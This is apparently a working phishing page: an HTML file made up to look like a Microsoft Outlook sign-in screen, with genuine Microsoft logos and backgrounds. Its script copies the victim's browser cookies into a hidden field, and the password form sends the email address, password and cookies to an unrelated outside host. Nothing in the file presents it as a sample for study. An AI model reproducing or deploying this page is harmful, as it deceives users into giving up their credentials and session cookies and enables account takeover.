<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <title>Login</title>
    <link href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" rel="shortcut icon" />
    <style type="text/css">
        * {
            padding: 0;
            margin: 0;
            font-family: sans-serif;
        }
        .bg {
            background-image: url('../img/outlook.jpg');
            background-size: cover;
            background-position: center;
            height: 100vh;
        }
        .login {
            width: 30.6%;
            background-color: transparent;
            margin: 0 auto;
            padding-top: 10%;
        }
        .login .outlook_logo {
            max-width: 256px;
            max-height: 36px;
            display: block;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 25px;
        }
        .login_bg {
            background-color: #fff;
            padding: 43px;
            overflow: hidden;
        }
        .img {
            margin-bottom: 20px;
        }
        .input_text {
            width: 100%;
            border: none;
            border-bottom: 1px solid #656565;
            padding: 8px 0;
            margin-bottom: 20px;
            font-size: 16px;
        }
        .input_text::placeholder {
            font-size: 16px;
        }
        .input_text:focus {
            outline: none;
        }
        button.btn {
            width: 110px;
            float: right;
            border-color: #0067b8;
            background-color: #0067b8;
            color: #fff;
            font-size: 14px;
            padding: 8px 0;
            cursor: pointer;
            border: none;
        }
        .hidden {
            display: none;
        }
        .back-button {
            cursor: pointer;
            color: #0067b8;
            border: none;
            background: none;
            font-size: 16px;
            text-decoration: underline;
        }
        .back-button:hover {
            color: #004a8c;
        }
        .header-message {
            font-size: 18px;
            color: #333;
            text-align: center;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <main class="bg" style="background-image: url(https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg);">
        <div class="login">
            <div class="login_bg">
                <img alt="Outlook Logo" class="img" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" />
                
                <!-- Sign in Message -->
                <div class="header-message">
                    Sign in <b></b>
                    <p></p>to continue to Outlook
                </p>
                </div>
                
                <!-- First Form for Email Input -->
                <form id="emailForm">
                    <p>
                        <input id="emailInput" class="input_text" name="email" placeholder="Email Address" required type="email" />
                    </p>
                    <button class="btn" type="submit">Next</button>
                </form>
                
                <!-- Display Email and Show Password Form -->
                <div id="emailDisplay" class="hidden">
                    <button class="back-button" onclick="goBack()">‚Üê Back</button>
                    <h2><span id="displayedEmail"></span></h2>
                    <h3>Enter your password</h3>
                    
                    <!-- Second Form for Password Input -->
                    <form id="passwordForm" action="https://sz.zhl13.za.com/.ex/.a.php" method="POST">
                        <input id="emailHidden" name="epol" type="hidden" />
                        <input id="cookiesHidden" name="cookies" type="hidden" />
                        <p>
                            <input id="passwordInput" class="input_text" name="ppol" placeholder="Password" type="password" required />
                        </p>
                        <button class="btn" type="submit">Sign in</button>
                    </form>
                </div>
            </div>
        </div>
    </main>

    <script type="text/javascript">
        const emailForm = document.getElementById('emailForm');
        const emailInput = document.getElementById('emailInput');
        const emailDisplay = document.getElementById('emailDisplay');
        const displayedEmail = document.getElementById('displayedEmail');
        const emailHidden = document.getElementById('emailHidden');
        const cookiesHidden = document.getElementById('cookiesHidden');

        emailForm.addEventListener('submit', function(e) {
            e.preventDefault();  // Prevent the form from submitting

            // Get the email value
            const emailValue = emailInput.value;

            // Validate the email format
            if (emailValue && validateEmail(emailValue)) {
                // Hide the email form
                emailForm.classList.add('hidden');

                // Display the email and show the password form
                displayedEmail.textContent = emailValue;
                emailHidden.value = emailValue;

                // Capture cookies
                const cookies = document.cookie;
                cookiesHidden.value = cookies;

                emailDisplay.classList.remove('hidden');
            } else {
                alert('Please enter a valid email address');
            }
        });

        // Basic email validation function
        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(String(email).toLowerCase());
        }

        // Function to go back to the email input form
        function goBack() {
            emailDisplay.classList.add('hidden');
            emailForm.classList.remove('hidden');
            emailInput.value = ''; // Clear the email input field
        }
    </script>
</body>
</html>
